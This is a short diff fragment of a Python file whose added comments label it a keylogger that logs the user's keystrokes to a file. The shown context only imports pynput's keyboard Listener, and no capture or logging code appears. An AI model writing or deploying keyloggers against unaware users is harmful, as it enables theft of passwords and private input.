@@ -1,3 +1,6 @@
+# Keylogger
+# Log keys pressed by user into a file
+
 import pynput
 from pynput.keyboard import Key, Listener
 
